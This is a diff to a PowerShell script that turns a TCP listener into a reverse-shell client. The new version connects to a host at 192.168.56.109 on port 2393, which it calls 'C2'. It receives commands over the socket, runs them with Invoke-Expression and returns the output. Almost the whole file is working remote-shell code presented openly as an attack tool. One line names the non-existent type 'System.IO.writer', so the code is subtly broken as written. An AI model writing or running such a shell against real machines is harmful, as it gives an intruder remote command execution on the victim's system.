@@ -1,46 +1,45 @@
 # Define the server's IP address and port
-$SERVER_HOST = "192.168.56.109"  # Replace with your IP address
-$SERVER_PORT = 9001
+$SERVER_HOST = "192.168.56.109"  # Replace with the server's IP address
+$SERVER_PORT = 2393
 
-# Create TCP listener object
-$TcpListener = [System.Net.Sockets.TcpListener]::new($SERVER_HOST, $SERVER_PORT)
+# Create a TCP client object
+$tcpClient = New-Object System.Net.Sockets.TcpClient
 
-# Start listening for incoming connections
-$TcpListener.Start()
-Write-Host ("[*] Server is now listening for incoming connections on {0}:{1}" -f $SERVER_HOST, $SERVER_PORT)
+# Connect to the server
+$tcpClient.Connect($SERVER_HOST, $SERVER_PORT)
 
+# Create a stream object for sending and receiving data
+$stream = $tcpClient.GetStream()
+$writer = New-Object System.IO.writer($stream)
+$reader = New-Object System.IO.StreamReader($stream)
 
-# Accept incoming client connection
-$TcpClient = $TcpListener.AcceptTcpClient()
-$NetworkStream = $TcpClient.GetStream()
-$StreamWriter = [System.IO.StreamWriter]::new($NetworkStream)
+# Writes a string to C2
+function WriteToStream ($String) {
+    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
+    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
 
-# Function to send command and output to client
-function Send-Command {
-    param (
-        [string]$Command
-    )
-    $StreamWriter.WriteLine($Command)
-    $StreamWriter.WriteLine("SHELL>")
-    $StreamWriter.Flush()
+    # Write to C2
+    $writer.Write($String + 'SHELL> ')
+    $writer.Flush()
 }
 
-# Main loop to send commands and receive output
-while ($true) {
-    # Read command from user input
-    $command = Read-Host "Enter command to execute (or 'exit' to quit):"
-    if ($command -eq "exit") {
-        break
-    }
+# Initial output to C2. The function also creates the inital empty byte array buffer used below.
+WriteToStream ''
 
-    # Send command to client
-    Send-Command -Command $command
+# Loop that breaks if stream.Read throws an exception - will happen if connection is closed.
+while(($BytesRead = $stream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+    # Encode command, remove last byte/newline
+    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
+    
+    # Execute command and save output (including errors thrown)
+    $Output = try {
+            Invoke-Expression $Command 2>&1 | Out-String
+        } catch {
+            $_ | Out-String
+        }
 
-    # Wait for client to execute command and send output
-    $output = $NetworkStream.ReadLine()
-    Write-Host "[Client Output]: $output"
+    # Write output to C2
+    WriteToStream ($Output)
 }
-
-# Close connection
-$TcpClient.Close()
-$TcpListener.Stop()
+# Closes the writer and the underlying TCPClient
+$writer.Close()
